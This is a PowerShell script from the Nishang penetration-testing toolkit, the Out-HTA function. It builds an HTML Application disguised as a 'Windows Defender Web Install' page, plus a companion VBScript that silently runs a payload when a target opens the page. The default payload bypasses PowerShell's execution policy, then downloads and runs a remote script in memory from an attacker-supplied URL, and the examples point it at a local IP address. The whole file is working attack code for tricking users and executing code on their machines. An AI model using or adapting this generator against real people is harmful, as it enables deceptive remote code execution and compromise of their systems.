
function Out-HTA
{
<#
.SYNOPSIS
Nishang script which could be used for generating HTML Application and accompanying VBscript. These could be deployed on 
a web server and powershell scripts and commands could be executed on the target machine.

.DESCRIPTION
The script generates two files. A HTA file and a VBScript. The HTA and VBScript should be deployed in same directory of a web server.
When a target browses to the HTA file the VBScript is executed. This VBScript is used to execute powershell scripts and commands.

.PARAMETER Payload
Payload which you want execute on the target.

.PARAMETER PayloadURL
URL of the powershell script which would be executed on the target.

.PARAMETER Arguments
Arguments to the powershell script to be executed on the target.

.PARAMETER HTAFilePath
Path to the HTA file to be generated. Default is with the name WindDef_WebInstall.hta in the current directory.

.PARAMETER VBFilename
Name of the VBScript file to be generated, use without ".vbs" extension. Default is launchps.vbs.

.PARAMETER VBFilepath
Path to the HTA file to be generated. Default is with the name launchps.vbs in the current directory.

.EXAMPLE
PS > Out-HTA -Payload "powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-ChildItem"

Above command would execute Get-ChildItem on the target machine when the HTA is opened.

.EXAMPLE
PS > Out-HTA -PayloadURL http://192.168.254.1/Get-Information.ps1

Use above command to generate HTA and VBS files which download and execute the given powershell script in memory on target.

.EXAMPLE
PS > Out-HTA -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-VM

Use above command to pass an argument to the powershell script/module.

.LINK
http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html
https://github.com/samratashok/nishang
#>


    [CmdletBinding()] Param(
        
        [Parameter(Position = 0, Mandatory = $False)]
        [String]
        $Payload,
        
        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $PayloadURL,

        
        [Parameter(Position = 2, Mandatory = $False)]
        [String]
        $Arguments,

        [Parameter(Position = 3, Mandatory = $False)]
        [String]
        $VBFilename="launchps.vbs",

        [Parameter(Position = 4, Mandatory = $False)]
        [String]
        $HTAFilePath="$pwd\WindDef_WebInstall.hta",


        [Parameter(Position = 5, Mandatory = $False)]
        [String]
        $VBFilepath="$pwd\launchps.vbs"
    )
    
    if(!$Payload)
    {
        $Payload = "powershell.exe -ExecutionPolicy Bypass -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
    }
    
    $HTA = @"
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    <html xmlns="http://www.w3.org/1999/xhtml">
    <head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
    <title>Windows Defender Web Install</title>
    <script src="$VBFilename" type="text/vbscript" >
    </script>
    <hta:application
       id="oHTA"
       applicationname="Windows Defender Web Install"
       application="yes"
    >
    </hta:application>
    </head>

    <SCRIPT TYPE="text/javascript">
    function start(){

    Initialize();

    }
    //-->
    </SCRIPT>
    <div> 
    <object type="text/html" data="http://windows.microsoft.com/en-IN/windows7/products/features/windows-defender" width="100%" height="100%">
    </object></div>   
 
  
    <body onload="start()">
    </body>
    </html>
"@

    $vbsscript = @"
    Sub Initialize()
    Set oShell = CreateObject( "WScript.Shell" )
    ps = "$Payload"
    oShell.run(ps),0,true
    End Sub
"@

    Out-File -InputObject $HTA -FilePath $HTAFilepath
    Out-File -InputObject $vbsscript -FilePath $VBFilepath
    Write-Output "HTA and VBS written to $HTAFilepath and $VBFilepath respectively."
}
